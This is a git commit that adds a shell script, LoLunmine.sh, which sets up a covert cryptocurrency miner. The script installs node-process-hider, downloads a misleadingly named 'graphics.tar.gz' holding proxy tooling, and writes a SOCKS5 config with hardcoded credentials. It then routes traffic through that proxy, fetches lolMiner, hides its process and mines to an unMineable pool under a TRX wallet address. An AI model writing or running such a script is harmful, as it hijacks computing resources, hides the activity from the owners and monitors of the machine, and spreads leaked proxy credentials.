e9ffc1d8d63fa725276cd51a07f70c4b19d2d86c
denisule54 <87700595+denisule54@users.noreply.github.com>
2022-03-12 14:10:52 +0700

    Create LoLunmine.sh

---
+++ LoLunmine.sh
@@ -0,0 +1,49 @@
+apt update && apt -y install sudo wget curl unzip
+
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://github.com/denisule54/why/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+
+listen = :2233
+
+loglevel = 1
+
+socks5 = 209.127.191.180:9279
+
+socks5_username = ehrfetal
+
+socks5_password = 5pxchgpzzz0t
+
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz
+tar -xf lolMiner_v1.46a_Lin64.tar.gz
+cd v1.46a
+
+ph add lolMiner
+
+./graftcp/graftcp ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TSegVmnvSAQ6MSAUMv28aWBgNtjtJJpMy1.$(echo $(shuf -i 1-9999 -n 1)-lol) --ethstratum ETHPROXY
